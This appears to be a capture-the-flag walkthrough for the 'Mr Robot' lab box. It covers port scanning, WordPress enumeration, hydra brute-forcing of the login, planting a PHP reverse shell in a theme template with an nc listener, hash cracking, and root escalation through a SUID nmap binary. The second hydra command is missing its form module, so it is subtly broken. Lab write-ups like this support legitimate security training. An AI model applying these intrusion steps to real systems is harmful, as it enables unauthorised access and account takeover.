# Mr Robot

*Based on the Mr. Robot show, can you root this box?*

## Walkthrough

This room is designed for beginner-intermediate players with three hidden flags hidden throughout.

We start with an `nmap` scan against the target machine:

```console
$ nmap -sC -sV -T4 -p- <ip_address> -oN full_scan
```

- `sC`: 
- `sV`:
- `-T4`: set intensity of scan to 4
- `-p-`: scan all ports (1-65535)
- `-oN`: output to specified file 

The resulting output identifies three ports/services, namely SSH on port 22, HTTP on port 80, and HTTPS on port 443.  Note that port 22 is showing as **closed**.  We also see Apache is running on the host. 

![[Pasted image 20230529120358.png]]

Targeting the web service running on ports, 80/443, we run `gobuster` and `nikto`:

```console
$ gobuster dir -u http://10.10.24.225 -w /usr/share/wordlists/diruster/directory-list-2.3-medium.txt
```

```console
$ nikto -h 10.10.24.225
```

Navigating to the website shows it is emulating a Linux terminal, allowing the user to input various commands.

![[Pasted image 20230529124022.png]]

For example, inputting `join` results in the following dialogue:

![[Pasted image 20230529124902.png]]

From `gobuster`, there are indications that this may be a WordPress website.

![[Pasted image 20230529153903.png]]

As such, we run `wpscan` against the website to enumerate WordPress elements:

```console
$ wpscan --url http://10.10.24.225
```

Notable findings include:

![[Pasted image 20230529131406.png]]

![[Pasted image 20230529131425.png]]

Navigating to `robots.txt` shows the following:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Retrieving both `fsocity.dic` and `key-1-of-3.txt` via `wget`, we obtain flag 1:

![[Pasted image 20230529132428.png]]

`fsocity.dic` is a dictionary file, containing `85160` words. Filtering out unique entries into a separate wordlist trims the total to `11451`:

```
$ cat fsocity.dic | wc -l
85160

$ sort fsocity.dic | uniq > sorted_fsocity.dic

$ cat sorted_fsocity.dic | wc -l
11451
```

Opening BurpSuite and navigating to `https://10.10.9.152/wp-login`, we see the default WordPress login page:

![[Pasted image 20230529160858.png]]

We then submit `admin:admin` to the page, capturing it on the BurpSuite proxy.

![[Pasted image 20230529160111.png]]

We then use this dictionary file in conjunction with `hydra` to bruteforce the WordPress login page (`https://10.10.9.152/wp-login`).  As we don't have a username or password, we will have to use our dictionary file to find both.  Starting with the username:

```
$ hydra -L sorted_fsocity.dic -p test 10.10.9.152 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
```

- `-L`: use wordlist for username
- `-p`: use one password for all attempts
- `http-post-form`: we want to brute force a HTTP form which accepts `POST` requests
- `/wp-login.php`: the endpoint of the login page
- `:log=^USER^&pwd=^PASS^&wp-submit=Log+In`: specifies where to insert the username/password
- `:Invalid username`: text presented by the page when an incorrect username is entered

![[Pasted image 20230529175711.png]]

Subsequently, we use the identified username `elliot` with the dictionary file to find the password:

```
$ hydra -l elliot -P sorted_fsocity.dic 10.10.9.152 '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username'
```

![[Pasted image 20230529190158.png]]

We now log into the WordPress site with our credentials `elliot:ER28-0652`

![[Pasted image 20230530211055.png]]

From our earlier `wpscan`, we know that the website is running the **Twenty Fifteen** theme. As such, we can open the **Theme Editor** and upload custom code in place of an existing page.

![[Pasted image 20230530211401.png]]

We can then select one of the templates and upload a PHP reverse shell (ref: [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)), ensuring that we input our IP address and port:

```php
...
$ip = '127.0.0.1';    // CHANGE THIS
$port = 1234;         // CHANGE THIS
...
```

![[Pasted image 20230530211746.png]]

We then configure a `nc` listener on our attacker machine to capture the callback connection:

```console
$ nc -nvlp <port>
```

- `n`: numeric only IPs (no DNS)
- `v`: set to verbose
- `l`: set to listen mode (for inbound connections)
- `p`: set local port number

When we navigate to a page which does not exist, the `404.php` template will be loaded, running our code.  This will create a connection from our attacker machine to the compromised website.

![[Pasted image 20230530212435.png]]

The above shows we are operating as the `daemon` user from the root of the filesystem (`/`).  As such, we need to find a way to escalate our privileges to the `root` user or to a user with higher privileges than `daemon`.  

First of all, we should stabilise our shell:

![[Pasted image 20230530214259.png]]

Firstly, we can perform manual enumeration.  We can see that there is one user within `/home`, namely `robot`.

![[Pasted image 20230530212831.png]]

Within `/home/robot`, we can find our second flag (`key-2-of-3.txt`) and a password hash file.  However, the permissions make it so we cannot read the contents of `key-2-of-3.txt` as our current user - we must be `robot` in order to read.

![[Pasted image 20230530213257.png]]

We can, however, view the contents of `password.raw-md5`:

![[Pasted image 20230530213456.png]]

With this MD5 hash, we are able to find the plaintext version via [CrackStation](https://crackstation.net/), an online hash cracking tool - `john` and `hashcat` can also be used.

![[Pasted image 20230530214441.png]]

With this cracked password, we can switch user (`su`) to `robot` and view the contents of `key-2-of-3.txt`:

![[Pasted image 20230530214544.png]]

![[Pasted image 20230530214907.png]]

Finally, we should now aim to escalate our privileges to the `root` user. One common method of privilege escalation is to use files with the set UID bit set (`SUID`).  Files with this bit set can be run as `root` temporarily to accomplish a given task. As such, it is recommended to apply these sparingly and only when absolutely necessary.

To search for these files, we can use `find`:

```
$ find / -type f -perm -u=s 2>/dev/null
```

- `/`: start the search from the root of the filesystem
- `-type f`: search for files
- `-perm -u=s`: search for files with the SUID permission bit set
- `2>/dev/null`: redirect the stderr (standard error) to `/dev/null` (suppress errors)

![[Pasted image 20230530215844.png]]

From the above, we can see `/usr/local/bin/nmap` has the SUID bit set.

![[Pasted image 20230530220053.png]]

We can check the version of this binary:

![[Pasted image 20230530220829.png]]

From [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#shell), a compiled list of UNIX binaries that can be used to bypass security controls, we see `nmap` can be launched on interactive mode (versions `2.02` to `5.21`).  We can then use the `!sh` command to spawn a shell as `root`.

![[Pasted image 20230530221045.png]]

Finally, we can view the contents of the `root` user's directory and retrieve the final flag:

![[Pasted image 20230530221405.png]]